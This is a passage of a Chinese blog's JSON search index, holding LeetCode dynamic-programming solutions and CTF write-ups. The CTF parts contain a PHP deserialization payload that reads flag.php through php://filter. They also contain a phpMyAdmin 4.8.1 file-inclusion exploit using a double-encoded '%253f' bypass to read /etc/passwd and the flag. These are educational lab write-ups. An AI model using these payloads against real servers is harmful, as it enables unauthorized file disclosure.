1str=O:11:&quot;FileHandler&quot;:3:&#123;S:5:&quot;\\00*\\00op&quot;;i:2;S:11:&quot;\\00*\\00filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:10:&quot;\\00*\\00content&quot;;N;&#125; 成功得到flag！ 致谢：小鹿同学","categories":[{"name":"CTF题解","slug":"CTF题解","permalink":"https://lalalashenle.github.io/categories/CTF%E9%A2%98%E8%A7%A3/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://lalalashenle.github.io/tags/CTF/"},{"name":"题解","slug":"题解","permalink":"https://lalalashenle.github.io/tags/%E9%A2%98%E8%A7%A3/"}]},{"title":"LeetCode-0279 Perfect Squares-题解","slug":"LeetCode-0279-Perfect-Squares","date":"2021-06-11T08:17:16.000Z","updated":"2022-06-18T07:32:05.374Z","comments":true,"path":"2021/06/11/LeetCode-0279-Perfect-Squares/","link":"","permalink":"https://lalalashenle.github.io/2021/06/11/LeetCode-0279-Perfect-Squares/","excerpt":"","text":"与0518-Coin-Change-2如出一辙，可等价思考为存在一个容积为n的背包，有体积为1、4、9、16……的物品，每样物品可选数量为无限个，问背包最少能被几个物品填满。直接上手一维数组优化版本，设计DP数组DP(i)，代表体积为i时的最少物品数量，则状态转移方程为： 1DP(i) = min(DP(I), DP(i - val) + 1) 其中val为物品体积。 代码如下： 12345678910class Solution: def numSquares(self, n: int) -&gt; int: index = 1 memo = [9999999999 for _ in range(0, n + 1)] memo[0] = 0 while index ** 2 &lt;= n: for i in range(index ** 2, n + 1): memo[i] = min(memo[i], memo[i - index ** 2] + 1) index += 1 return memo[n] 直接超时了 :（ 检查一下，对memo数组的循环存在过多冗余，将memo主循环移到第一层，优化后代码如下： 12345678910class Solution: def numSquares(self, n: int) -&gt; int: memo = [9999999999 for _ in range(0, n + 1)] memo[0] = 0 for i in range(1, n + 1): index = 1 while i &gt;= index ** 2: memo[i] = min(memo[i], memo[i - index ** 2] + 1) index += 1 return memo[n] 裂开，居然还是超时了。。 代码貌似没有什么优化空间了，不由得怀疑是Python太慢了导致的超时问题，换Cpp试试看： 12345678910111213141516class Solution &#123;public: int numSquares(int n) &#123; vector&lt;int&gt; memo(n + 1, INT32_MAX); memo[0] = 0; for(int i = 1; i &lt;= n; i++) &#123; int index = 1; while(i &gt;= index * index) &#123; memo[i] = min(memo[i - index * index] + 1, memo[i]); index++; &#125; &#125; return memo[n]; &#125;&#125;; 啊这，动规问题看来还是适合用C++写呀~ 也可以利用BFS算法求解该题，过程类似最短路径。以数字7为例： 123456789 7 / \\ 6 3 /\\ \\ 5 2 2 / \\ \\ /4 1 1 1 \\ ... 每一层代表从上一层结点减去一个Perfect Square后的结果，显然最早产生叶子节点的层次为最短路径，也就是n中含有的Perfect Square的最少数量。 BFS的思路比较简单，主要需注意三部分： 利用”先进先出”队列存储结点 先弹出队头结点，再依次推入子结点 利用visited数组保存已记录结点，起到剪枝效果 1234567891011121314151617class Solution: def numSquares(self, n: int) -&gt; int: # BFS deq = deque() deq.append((n, 0)) # (amount, step) visited = set() while len(deq): amount, step = deq.popleft() index = 1 while amount - index ** 2 &gt;= 0: if amount - index ** 2 == 0: return step + 1 if amount - index ** 2 not in visited: deq.append((amount - index ** 2, step + 1)) visited.add(amount - index ** 2) index += 1 return -1 致谢：小鹿同学","categories":[{"name":"LeetCode题解","slug":"LeetCode题解","permalink":"https://lalalashenle.github.io/categories/LeetCode%E9%A2%98%E8%A7%A3/"}],"tags":[{"name":"题解","slug":"题解","permalink":"https://lalalashenle.github.io/tags/%E9%A2%98%E8%A7%A3/"},{"name":"LeetCode","slug":"LeetCode","permalink":"https://lalalashenle.github.io/tags/LeetCode/"},{"name":"动态规划","slug":"动态规划","permalink":"https://lalalashenle.github.io/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"}]},{"title":"LeetCode-0518 Coin Change 2-题解","slug":"LeetCode-0518-Coin-Change-2","date":"2021-06-10T14:21:17.000Z","updated":"2022-06-18T07:32:11.999Z","comments":true,"path":"2021/06/10/LeetCode-0518-Coin-Change-2/","link":"","permalink":"https://lalalashenle.github.io/2021/06/10/LeetCode-0518-Coin-Change-2/","excerpt":"","text":"此题可转化为完全背包问题，amount相当于背包容积，coins相当于物品体积，同时coins可无限制数量地提取。 朴素解法：设计DP数组，DP(i, j)含义为取前i个coins，amount为j时地组合数量，则状态转移方程为： 12# j - k * coins[i] &gt;= 0, k为正整数DP(i, j) = DP(i - 1, j) + sum(DP(i - 1, j - k * coins[i])) 无优化版本，提交后果断超时 1234567891011121314class Solution: def change(self, amount: int, coins: List[int]) -&gt; int: len_c = len(coins) memo = [[0 for _ in range(0, amount + 1)] for _ in range(0, len_c + 1)] memo[0][0] = 1 for i in range(1, len_c + 1): for j in range(0, amount + 1): ind = 1 memo[i][j] = memo[i - 1][j] while j - ind * coins[i - 1] &gt;= 0: memo[i][j] += memo[i - 1][j - ind * coins[i - 1]] ind += 1 return memo[len_c][amount] 进行一维空间优化，将DP(i - 1, j - k * coins[i])换成DP(j - coins[i])，优化后代码如下： 12345678class Solution: def change(self, amount: int, coins: List[int]) -&gt; int: memo = [0 for _ in range(0, amount + 1)] memo[0] = 1 for c in coins: for i in range(c, amount + 1): memo[i] += memo[i - c] return memo[amount] 致谢：小鹿同学","categories":[{"name":"LeetCode题解","slug":"LeetCode题解","permalink":"https://lalalashenle.github.io/categories/LeetCode%E9%A2%98%E8%A7%A3/"}],"tags":[{"name":"题解","slug":"题解","permalink":"https://lalalashenle.github.io/tags/%E9%A2%98%E8%A7%A3/"},{"name":"LeetCode","slug":"LeetCode","permalink":"https://lalalashenle.github.io/tags/LeetCode/"},{"name":"动态规划","slug":"动态规划","permalink":"https://lalalashenle.github.io/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"}]},{"title":"LeetCode-0879 Profitable Schemes-题解","slug":"LeetCode-0879-Profitable-Schemes","date":"2021-06-09T05:08:48.000Z","updated":"2022-06-18T07:32:19.604Z","comments":true,"path":"2021/06/09/LeetCode-0879-Profitable-Schemes/","link":"","permalink":"https://lalalashenle.github.io/2021/06/09/LeetCode-0879-Profitable-Schemes/","excerpt":"","text":"看到”profit”和”group”这两个一一对应的数组，基本就可以自然而然想到这是个0-1背包变种问题了。仔细审题后发现还存在”minProfit”这个影响因子，因此猜测此题为三维0-1背包问题。 老规矩，构造DP数组。令DP(i, j, k)为取前i件事情，取前j个成员，最小利润至少为k时，crimes的子集最大数。 首先容易看出DP(0, j, 0) = 1，意为取0件事且最小利润至少为0，那么DP数组就和成员数量无关了。 接着尝试构造状态转移方程，分两种情况： 加入第i件事时，若不选择此事件，则： 1DP(i, j, k) = DP(i - 1, j, k) 加入第i件事时，若选择此事件，则： 1DP(i, j, k) = DP(i - 1, j - group[i], k - profit[i]) 需要注意一点，因为minProfit的含义是利润至少为多少，故k - profit[i]的值至少为0，方便起见，将状态转移方程优化为： 1DP(i, j, k) = DP(i - 1, j - group[i], MAX(0, k - profit[i])) 代码如下： 12345678910111213141516171819202122232425262728293031# @Title : 0879 Profitable Schemes# @Level : hard# @Address : https://leetcode-cn.com/problems/profitable-schemes/# @Date : 2021-06-09# @Author : lalalashenlefrom typing import Listclass Solution: def profitableSchemes(self, n: int, minProfit: int, group: List[int], profit: List[int]) -&gt; int: mod = 10**9 + 7 len_p = len(profit) + 1 memo = [[[0 for _ in range(0, minProfit + 1)] for _ in range(0, n + 1)] for _ in range(0, len_p)] for j in range(0, n + 1): memo[0][j][0] = 1 for i in range(1, len_p): for j in range(0, n + 1): for k in range(0, minProfit + 1): memo[i][j][k] = memo[i - 1][j][k] if j &gt;= group[i - 1]: memo[i][j][k] += (memo[i - 1][j - group[i - 1]][max(0, k - profit[i - 1])]) return memo[len_p - 1][n][minProfit] % modS = Solution()n = 5minProfit = 3group = [2, 2]profit = [2, 3]print(S.profitableSchemes(n, minProfit, group, profit)) 由于DP(i, j, k)只和DP(i - 1)有关，故可利用滚动数组在行二维数组空间代码优化，核心代码如下： 123456for i in range(1, len_p): for j in range(n, 0, -1): for k in range(0, minProfit + 1): if j &gt;= group[i - 1]: pro = max(0, k - profit[i - 1]) memo[j][k] += memo[j - group[i - 1]][pro] 致谢：小鹿同学","categories":[{"name":"LeetCode题解","slug":"LeetCode题解","permalink":"https://lalalashenle.github.io/categories/LeetCode%E9%A2%98%E8%A7%A3/"}],"tags":[{"name":"题解","slug":"题解","permalink":"https://lalalashenle.github.io/tags/%E9%A2%98%E8%A7%A3/"},{"name":"LeetCode","slug":"LeetCode","permalink":"https://lalalashenle.github.io/tags/LeetCode/"},{"name":"动态规划","slug":"动态规划","permalink":"https://lalalashenle.github.io/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"}]},{"title":"CTF-CWCTF 2019-我有一个数据库-题解","slug":"CTF-CWCTF-2019-我有一个数据库","date":"2021-06-08T14:59:43.000Z","updated":"2022-06-18T07:31:54.358Z","comments":true,"path":"2021/06/08/CTF-CWCTF-2019-我有一个数据库/","link":"","permalink":"https://lalalashenle.github.io/2021/06/08/CTF-CWCTF-2019-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/","excerpt":"","text":"打开靶机网站，出现的是白茫茫的一片。 查看网页源代码，也没有看到任何hints。 利用dirsearch.py扫描一下网站目录： 题目”我有一个数据库”实际也暗示存在”phpmyadmin”目录了。输入地址跳转后，得到一些信息： phpMyAdmin版本为4.8.1，存在远程文件包含漏洞，代码审计如下： 123456789101112public static $goto_whitelist = array( &#x27;db_datadict.php&#x27;, &#x27;db_sql.php&#x27;, &#x27;db_events.php&#x27;, &#x27;db_export.php&#x27;, &#x27;db_importdocsql.php&#x27;, &#x27;db_multi_table_query.php&#x27;, &#x27;db_structure.php&#x27;, &#x27;db_import.php&#x27;, ... ...); 1234567891011$_page = urldecode($page);$_page = mb_substr( $_page, 0, mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;));if (in_array($_page, $whitelist)) &#123; return true;&#125;return false; 可以看出，若’?’前的page在白名单中，则return true。可通过双重编码进行相应绕过，payload如下： 1?target=db_datadict.php%253f+(&quot;文件包含路径&quot;) “%253f”第一次解码为”%3f”，第二次解码为”?”，此时构造的payload已经顺利通过$_page的检查方法。而第一次解码得到的”%3f”会上传至index.php的”$_REQUEST[‘target’]”中，可以进行文件包含操作。 读取/etc/passwd，测试是否可以顺利执行文件包含： 测试成功，读取”/flag”即可得到flag。 致谢：小鹿同学","categories":[{"name":"CTF题解","slug":"CTF题解","permalink":"https://lalalashenle.github.io/categories/CTF%E9%A2%98%E8%A7%A3/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://lalalashenle.github.io/tags/CTF/"},{"name":"题解","slug":"题解","permalink":"https://lalalashenle.github.io/tags/%E9%A2%98%E8%A7%A3/"}]},{"title":"LeetCode-1049 Last Stone Weight-II-题解","slug":"LeetCode-1049-Last-Stone-Weight-II","date":"2021-06-08T07:13:27.000Z","updated":"2022-06-18T07:32:22.571Z","comments":true,"path":"2021/06/08/LeetCode-1049-Last-Stone-Weight-II/","link":"","permalink":"https://lalalashenle.github.io/2021/06/08/LeetCode-1049-Last-Stone-Weight-II/","excerpt":"","text":"第一次做带放回操作的背包问题。 首先观察此题如何转化为背包问题。审题后可以看出，最终的石子重量实际上就是一堆石子重量减去另一堆石子重量，这就可以发现实际上这题和”0494-Target Sum”十分想象，前期处理也大体相同。将stones数组划为两个子集Positive和Negative，分别存储系数为+1和-1的数。则sum_stones = Positive + Negative 可转化为：ans = sum_stones - 2 * Negative，其中ans代表最终剩余的石子重量，也就是题目所要求的值。那么题目要求的是”最小”的剩余石子重量，即：min(ans)，简单求导容易得出结论：Negative越大，则ans越小，同时需满足 sum_stones - 2 * Negative &gt; 0 的约束条件。 至此，此题已转化为一个通俗0-1背包问题。背包容量为 sum_stones / 2，物品容积与价值皆为stones[i]。构造DP数组DP(i, j)，含义为：当选择前i个物品（即，石子），且背包容量（即，Negative数集的和）为j时，最多能达到多大的物品容积。 因为已经转化为通俗0-1背包问题了，那么不难构造状态转移方程： 1DP(i, j) = MAX(DP(i - 1, j), DP(i - 1, j - stones[i] + stones[i])); 对了，前面提到此题为”带放回操作”的背包问题，那么放回操作是否会对上述构造的状态转移方程产生影响呢？假设有A、B、C三个石子，取A、B两石子碰撞，得 A - B，将 A - B 放回。再取 A - B 与 C两石子碰撞，可得 C - (A - B)，即：C - A + B，相当于取B、C为正数集，A为负数集（注意，只举了一个简单例子，为标明A、B、C大小，有心的朋友可以加入大小的假设再演算一遍，会发现结果是相同的）。故可以发现，”放回操作”实际上并不影响此题对0-1背包的转化，但也确实增加一点题目的思考难度了。 代码如下： 1234567891011121314151617181920212223242526# @Title : 1049 最后一块石头的重量-II# @Level : medium# @Address : https://leetcode-cn.com/problems/last-stone-weight-ii/# @Date : 2021-06-08# @Author : lalalashenlefrom typing import Listclass Solution: def lastStoneWeightII(self, stones: List[int]) -&gt; int: sum_s = 0 len_s = len(stones) for s in stones: sum_s += s memo = [[0 for _ in range(0, sum_s // 2 + 1)] for _ in range(0, len_s + 1)] for i in range(1, len_s + 1): for j in range(0, sum_s // 2 + 1): memo[i][j] = memo[i - 1][j] if j &gt;= stones[i - 1]: memo[i][j] = max(memo[i][j], memo[i - 1][j - stones[i - 1]] + stones[i - 1]) return sum_s - 2 * memo[len_s][sum_s // 2]S = Solution()stones = [22, 1, 6, 64, 12, 68, 15] # 2print(S.lastStoneWeightII(stones)) 当然，既然是0-1背包问题，我们就可以对二维DP数组进行”滚动数组”、”一维空间优化”等优化操作，日后再开贴讨论背包问题的几个优化策略吧 ：） 致谢：小鹿同学","categories":[{"name":"LeetCode题解","slug":"LeetCode题解","permalink":"https://lalalashenle.github.io/categories/LeetCode%E9%A2%98%E8%A7%A3/"}],"tags":[{"name":"题解","slug":"题解","permalink":"https://lalalashenle.github.io/tags/%E9%A2%98%E8%A7%A3/"},{"name":"LeetCode","slug":"LeetCode","permalink":"https://lalalashenle.github.io/tags/LeetCode/"},{"name":"动态规划","slug":"动态规划","permalink":"https://lalalashenle.github.io/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"}]},{"title":"LeetCode-0494 Target Sum-题解","slug":"LeetCode-0494-Target-Sum","date":"2021-06-07T15:35:55.000Z","updated":"2022-06-18T07:32:07.827Z","comments":true,"path":"2021/06/07/LeetCode-0494-Target-Sum/","link":"","permalink":"https://lalalashenle.github.io/2021/06/07/LeetCode-0494-Target-Sum/","excerpt":"","text":"LeetCode进入了背包月，今天又是一道魔改背包问题。 审题后，注意到： 若设nums数集可分解为正数集Positive以及负数集Negative，则：Positive + Negative = sumNums 而target的定义为：Postive + (-Negative) = target，即：Positive = target + Negative 容易得到：Positive = target + sumNums - Positive，即：Positive = (target + sumNums) / 2 因为 0 &lt;= nums[i] 且 nums[i] 为自然数，故Positive一定为自然数。若Positive不为int型数，则考虑nums中不存在符合题意的和为target的正负数集，此时应 return 0 至此，可发现此题实际为0-1背包问题，设计DP数组，DP(i, j)代表取前i个数，当和为j时的最大个数。 边界为：DP(0, 0) = 1，因为取0个数时，只能得到和为0一种结果。同时也可得：DP(0, j) = 0 状态转移方程： 取和(即j)时，考虑两种情况： j小于当前可取的数(nums[i])，此时：DP(i, j) = DP(i - 1, j) j大于等于当前可取的数(nums[i])，此时： 不选择加入nums[i]，则：DP(i, j) = DP(i - 1, j) 选择加入nums[i]，则：DP(i, j) = DP(i - 1, j - nums[i]) 则：DP(i, j) = DP(i - 1, j) + DP(i - 1, j - nums[i]) 综上得状态转移方程： 12DP(i, j) = DP(i - 1, j) + DP(i - 1, j - nums[i]) , j &gt;= nums[i] DP(i - 1, j) , j &lt; nums[i] 代码如下： 1234567891011121314151617181920212223242526272829303132# @Title : 0494 目标和# @Level : medium# @Address : https://leetcode-cn.com/problems/target-sum/# @Date : 2021-06-07# @Author : lalalashenlefrom typing import Listclass Solution: def findTargetSumWays(self, nums: List[int], target: int) -&gt; int: sum_nums = 0 len_nums = len(nums) for n in nums: sum_nums += n if (target + sum_nums) % 2 != 0: return 0 sum_positive = (target + sum_nums) // 2 # dp(i, j) --&gt; 取前i个数，和为j的个数 memo = [[0 for j in range(0, sum_positive + 1)] for i in range(0, len_nums + 1)] memo[0][0] = 1 for i in range(1, len_nums + 1): for j in range(0, sum_positive + 1): memo[i][j] = memo[i - 1][j] if j &gt;= nums[i - 1]: memo[i][j] += memo[i - 1][j - nums[i - 1]] return memo[len_nums][sum_positive]S = Solution()nums = [1]target = 2print(S.findTargetSumWays(nums, target)) 提交时发现了自己一年前的提交代码，现在已经有点看不懂了哈哈 : ) 123456789101112131415161718192021class Solution &#123;public: int findTargetSumWays(vector&lt;int&gt;&amp; nums, int S) &#123; if(S &gt; 1000 || S &lt; -1000) return 0; int n = nums.size(); vector&lt;vector&lt;int&gt; &gt; memo(n, vector&lt;int&gt;(2001, 0)); // 和的取值范围：[-1000, 1000] memo[0][nums[0] + 1000] = 1; memo[0][-nums[0] + 1000] += 1; for(int i = 1; i &lt; n; i++) &#123; for(int j = 0; j &lt; 2001; j++) &#123; if(j + nums[i] &gt;= 0 &amp;&amp; j + nums[i] &lt; 2001) memo[i][j] += memo[i - 1][j + nums[i]]; if(j - nums[i] &gt;= 0 &amp;&amp; j - nums[i] &lt; 2001) memo[i][j] += memo[i - 1][j - nums[i]]; &#125; &#125; return memo[n - 1][S + 1000]; &#125;&#125;; 致谢：小鹿同学","categories":[{"name":"LeetCode题解","slug":"LeetCode题解","permalink":"https://lalalashenle.github.io/categories/LeetCode%E9%A2%98%E8%A7%A3/"}],"tags":[{"name":"题解","slug":"题解","permalink":"https://lalalashenle.github.io/tags/%E9%A2%98%E8%A7%A3/"},{"name":"LeetCode","slug":"LeetCode","permalink":"https://lalalashenle.github.io/tags/LeetCode/"},{"name":"动态规划","slug":"动态规划","permalink":"https://lalalashenle.github.io/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"}]}],"categories":[{"name":"HTB靶场","slug":"HTB靶场","permalink":"https://lalalashenle.github.io/categories/HTB%E9%9D%B6%E5%9C%BA/"},{"name":"知识交流","slug":"知识交流","permalink":"https://lalalashenle.github.io/categories/%E7%9F%A5%E8%AF%86%E4%BA%A4%E6%B5%81/"},{"name":"漏洞分析","slug":"漏洞分析","permalink":"https://lalalashenle.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://lalalashenle.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"LeetCode题解","slug":"LeetCode题解","permalink":"https://lalalashenle.github.io/categories/LeetCode%E9%A2%98%E8%A7%A3/"},{"name":"CTF题解","slug":"CTF题解","permalink":"https://lalalashenle.github.io/categories/CTF%E9%A2%98%E8%A7%A3/"}],"tags":[{"name":"MSSQL","slug":"MSSQL","permalink":"https://lalalashenle.github.io/tags/MSSQL/"},{"name":"ADCS提权","slug":"ADCS提权","permalink":"https://lalalashenle.github.io/tags/ADCS%E6%8F%90%E6%9D%83/"},{"name":"ssrf","slug":"ssrf","permalink":"https://lalalashenle.github.io/tags/ssrf/"},{"name":"DNS重绑定","slug":"DNS重绑定","permalink":"https://lalalashenle.github.io/tags/DNS%E9%87%8D%E7%BB%91%E5%AE%9A/"},{"name":"Confluence","slug":"Confluence","permalink":"https://lalalashenle.github.io/tags/Confluence/"},{"name":"OGNL表达式注入","slug":"OGNL表达式注入","permalink":"https://lalalashenle.github.io/tags/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/"},{"name":"漏洞","slug":"漏洞","permalink":"https://lalalashenle.github.io/tags/%E6%BC%8F%E6%B4%9E/"},{"name":"云安全","slug":"云安全","permalink":"https://lalalashenle.github.io/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"},{"name":"Kubernetes","slug":"Kubernetes","permalink":"https://lalalashenle.github.io/tags/Kubernetes/"},{"name":"DoS攻击","slug":"DoS攻击","permalink":"https://lalalashenle.github.io/tags/DoS%E6%94%BB%E5%87%BB/"},{"name":"docker","slug":"docker","permalink":"https://lalalashenle.github.io/tags/docker/"},{"name":"题解","slug":"题解","permalink":"https://lalalashenle.github.io/tags/%E9%A2%98%E8%A7%A3/"},{"name":"LeetCode","slug":"LeetCode","permalink":"https://lalalashenle.github.io/tags/LeetCode/"},{"name":"双指针","slug":"双指针","permalink":"https://lalalashenle.github.io/tags/%E5%8F%8C%E6%8C%87%E9%92%88/"},{"name":"redis","slug":"redis","permalink":"https://lalalashenle.github.io/tags/redis/"},{"name":"CTF","slug":"CTF","permalink":"https://lalalashenle.github.io/tags/CTF/"},{"name":"JNU新生赛","slug":"JNU新生赛","permalink":"https://lalalashenle.github.io/tags/JNU%E6%96%B0%E7%94%9F%E8%B5%9B/"},{"name":"回溯","slug":"回溯","permalink":"https://lalalashenle.github.io/tags/%E5%9B%9E%E6%BA%AF/"},{"name":"自动机","slug":"自动机","permalink":"https://lalalashenle.github.io/tags/%E8%87%AA%E5%8A%A8%E6%9C%BA/"},{"name":"动态规划","slug":"动态规划","permalink":"https://lalalashenle.github.io/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"}]}